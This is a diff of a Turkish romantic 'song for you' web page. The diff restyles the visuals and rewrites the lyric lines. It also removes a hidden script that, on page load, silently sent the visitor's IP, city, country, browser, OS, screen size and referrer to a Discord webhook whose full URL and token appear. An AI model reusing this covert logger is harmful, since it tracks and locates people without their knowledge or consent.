@@ -4,17 +4,26 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Sana küçük bir şey</title>
+
   <style>
-    /* Mevcut stilleriniz aynı kalıyor */
-    * { margin: 0; padding: 0; box-sizing: border-box; }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
     body {
       width: 100%;
       height: 100vh;
-      background: #000;
+      background:
+        radial-gradient(circle at 25% 20%, rgba(255, 190, 120, 0.22), transparent 32%),
+        radial-gradient(circle at 75% 70%, rgba(120, 170, 255, 0.20), transparent 35%),
+        linear-gradient(135deg, #07070d 0%, #111827 45%, #1f160f 100%);
       color: white;
-      font-family: "Georgia", serif;
+      font-family: Georgia, serif;
       overflow: hidden;
     }
+
     .screen {
       width: 100%;
       height: 100vh;
@@ -25,139 +34,184 @@
       padding: 24px;
       position: relative;
     }
-    .glow {
+
+    .sun {
       position: absolute;
-      width: 320px;
-      height: 320px;
-      background: rgba(255, 255, 255, 0.08);
+      width: 380px;
+      height: 380px;
       border-radius: 50%;
-      filter: blur(70px);
-      animation: pulse 4s infinite alternate;
+      background: rgba(255, 210, 140, 0.12);
+      filter: blur(55px);
+      animation: breathe 5s ease-in-out infinite alternate;
     }
-    @keyframes pulse {
-      from { transform: scale(0.9); opacity: 0.4; }
-      to { transform: scale(1.2); opacity: 0.8; }
+
+    .stars span {
+      position: absolute;
+      width: 3px;
+      height: 3px;
+      background: rgba(255,255,255,0.65);
+      border-radius: 50%;
+      animation: drift 10s linear infinite;
     }
+
+    .stars span:nth-child(1) { left: 12%; top: 18%; animation-delay: 0s; }
+    .stars span:nth-child(2) { left: 28%; top: 76%; animation-delay: 1.5s; }
+    .stars span:nth-child(3) { left: 47%; top: 22%; animation-delay: 3s; }
+    .stars span:nth-child(4) { left: 68%; top: 64%; animation-delay: 4.5s; }
+    .stars span:nth-child(5) { left: 86%; top: 28%; animation-delay: 6s; }
+
+    @keyframes breathe {
+      from {
+        transform: scale(0.85);
+        opacity: 0.45;
+      }
+      to {
+        transform: scale(1.18);
+        opacity: 0.9;
+      }
+    }
+
+    @keyframes drift {
+      from {
+        transform: translateY(0);
+        opacity: 0.25;
+      }
+      50% {
+        opacity: 0.9;
+      }
+      to {
+        transform: translateY(-70px);
+        opacity: 0.2;
+      }
+    }
+
     .content {
       z-index: 2;
-      max-width: 760px;
+      max-width: 780px;
       opacity: 0;
-      transform: translateY(20px);
-      animation: fadeIn 2s ease forwards;
+      transform: translateY(18px);
+      animation: fadeIn 1.8s ease forwards;
     }
+
     @keyframes fadeIn {
-      to { opacity: 1; transform: translateY(0); }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
     }
-    h1 { font-size: clamp(30px, 6vw, 64px); font-weight: normal; margin-bottom: 24px; letter-spacing: 1px; }
-    p { font-size: clamp(18px, 3vw, 28px); line-height: 1.6; color: #ddd; }
+
+    h1 {
+      font-size: clamp(32px, 6vw, 68px);
+      font-weight: normal;
+      margin-bottom: 24px;
+      letter-spacing: 1px;
+    }
+
+    p {
+      font-size: clamp(18px, 3vw, 28px);
+      line-height: 1.6;
+      color: #eee;
+      text-shadow: 0 8px 30px rgba(0,0,0,0.35);
+    }
+
     button {
-      margin-top: 32px;
-      background: transparent;
+      margin-top: 34px;
+      background: rgba(255,255,255,0.08);
       color: white;
-      border: 1px solid rgba(255,255,255,0.5);
-      padding: 14px 28px;
+      border: 1px solid rgba(255,255,255,0.42);
+      padding: 14px 30px;
       border-radius: 999px;
       font-size: 16px;
       cursor: pointer;
+      backdrop-filter: blur(10px);
       transition: 0.3s;
     }
-    button:hover { background: white; color: black; }
-    .hidden { display: none; }
-    .line { opacity: 0; transform: translateY(12px); animation: lineIn 1.4s ease forwards; margin-bottom: 16px; }
-    @keyframes lineIn { to { opacity: 1; transform: translateY(0); } }
-    .small { margin-top: 28px; font-size: 15px; color: #888; }
+
+    button:hover {
+      background: white;
+      color: black;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .line {
+      opacity: 0;
+      transform: translateY(14px) scale(0.98);
+      animation: lineIn 1.5s ease forwards;
+      margin-bottom: 17px;
+    }
+
+    @keyframes lineIn {
+      to {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+
+    .small {
+      margin-top: 28px;
+      font-size: 15px;
+      color: rgba(255,255,255,0.62);
+    }
   </style>
 </head>
+
 <body>
   <audio id="song" src="audio.mp3"></audio>
-  
+
   <div class="screen">
-    <div class="glow"></div>
+    <div class="sun"></div>
+
+    <div class="stars">
+      <span></span>
+      <span></span>
+      <span></span>
+      <span></span>
+      <span></span>
+    </div>
+
     <div class="content" id="intro">
-      <h1>Selam Berra.</h1>
-      <p>Bu şarkı sana.</p>
+      <h1>Yine sen.</h1>
+      <p>Bu sefer biraz daha başka.</p>
       <p class="small">Hazırsan dokun.</p>
       <button onclick="start()">Başlat</button>
     </div>
+
     <div class="content hidden" id="lyricsBox">
       <div id="lyrics"></div>
     </div>
   </div>
 
   <script>
-    const webhookURL = "https://discord.com/api/webhooks/1508712355394228246/oc4CCNXtkEi5_mQuD5h9AW3lXk4q08j-3V1pQRruv_lJHti1UDAXYFaOJ7YEKYMbSzp-";
-
-    // Ziyaretçi bilgilerini topla ve webhook'a gönder
-    async function sendVisitorData() {
-      try {
-        // IP ve lokasyon bilgisi
-        const ipRes = await fetch("https://ipapi.co/json/");
-        const ipData = await ipRes.json();
-
-        const userAgent = navigator.userAgent;
-        const platform = navigator.platform;
-        const language = navigator.language;
-        const screenSize = `${screen.width}x${screen.height}`;
-        const referrer = document.referrer || "Direct";
-
-        const data = {
-          content: "**Yeni Ziyaretçi**",
-          embeds: [{
-            color: 0x00ff00,
-            timestamp: new Date().toISOString(),
-            fields: [
-              { name: "IP", value: `\`${ipData.ip}\``, inline: true },
-              { name: "Şehir", value: ipData.city || "Bilinmiyor", inline: true },
-              { name: "Ülke", value: `${ipData.country_name} (${ipData.country_code})`, inline: true },
-              { name: "Tarayıcı", value: userAgent.substring(0, 100) + "...", inline: false },
-              { name: "İşletim Sistemi", value: platform, inline: true },
-              { name: "Dil", value: language, inline: true },
-              { name: "Ekran Çözünürlüğü", value: screenSize, inline: true },
-              { name: "Cihaz Tipi", value: /Mobi|Android/i.test(userAgent) ? "📱 Mobil" : "💻 Desktop", inline: true },
-              { name: "Referrer", value: referrer, inline: false }
-            ]
-          }]
-        };
-
-        await fetch(webhookURL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(data)
-        });
-      } catch (err) {
-        console.error("Webhook gönderim hatası:", err);
-      }
-    }
-
-    // Sayfa yüklenir yüklenmez veri gönder
-    window.onload = () => {
-      sendVisitorData();
-    };
-
-    // Mevcut şarkı ve lyrics kodları
     const song = document.getElementById("song");
     const intro = document.getElementById("intro");
     const lyricsBox = document.getElementById("lyricsBox");
     const lyrics = document.getElementById("lyrics");
 
     const lines = [
-      "Bazı şarkılar vardır,",
-      "insanın aklına direkt birini getirir.",
-      "Bu da benim için öyle.",
-      "Çalınca seni düşünüyorum.",
-      "Gülüşünü, sesini, yanımda oluşunu...",
-      "Ve galiba en çok da şunu:",
-      "Benim en güzel tesadüfüm sensin.",
-      "Bu şarkı sana.",
-      "Çünkü bazı duygular konuşarak değil,",
-      "böyle anlatılır."
+      "Bazı şarkılar gece gibi değildir.",
+      "Bazıları gün batımı gibi gelir.",
+      "Biraz uzak, biraz sıcak, biraz hatıra gibi.",
+      "Bu şarkı da öyle hissettiriyor.",
+      "Sanki kalabalığın içinde sadece seni görmüşüm gibi.",
+      "Sanki her ışık biraz sana benziyormuş gibi.",
+      "Ben bu şarkıyı dinlerken",
+      "bir yere gitmek istemiyorum aslında.",
+      "Sadece o anın içinde kalmak istiyorum.",
+      "Çünkü bazı insanlar",
+      "bir şarkıdan daha uzun süre akılda kalır.",
+      "Sen de onlardan birisin."
     ];
 
     function start() {
-      song.volume = 0.75;
+      song.volume = 0.72;
       song.play();
+
       intro.classList.add("hidden");
       lyricsBox.classList.remove("hidden");
+
       showLines();
     }
 
@@ -168,7 +222,7 @@
           line.className = "line";
           line.textContent = text;
           lyrics.appendChild(line);
-        }, index * 2500);
+        }, index * 3300);
       });
     }
   </script>
